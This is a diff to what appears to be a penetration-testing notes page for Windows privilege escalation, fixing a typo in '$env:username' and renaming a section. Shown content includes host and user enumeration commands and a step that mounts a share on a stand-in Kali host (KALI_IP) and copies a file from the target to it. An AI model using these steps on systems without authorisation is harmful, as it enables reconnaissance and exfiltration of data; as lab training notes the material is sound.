@@ -740,7 +740,7 @@ Get-ChildItem C:\Users -Force | select Name
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
-$env:usernadsc
+$env:username
 net accounts
 ```
 
@@ -797,13 +797,13 @@ Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
 
 </Accordion>
 
-<Accordion title="Copy a Windows file into an authenticated lab share">
+<Accordion title="2. Windows — connect and copy">
 
-### Copy a Windows file into an authenticated lab share
+### 2. Windows — connect and copy
 
 **Windows → Kali file transfer**
 
-```console
+```bash
 net use \\KALI_IP\share /user:transfer TRANSFER_PASSWORD
 copy C:\path\file.zip \\KALI_IP\share\file.zip
 ```
@@ -817,6 +817,8 @@ copy C:\path\file.zip \\KALI_IP\share\file.zip
 - [Official documentation 1](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-commands)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
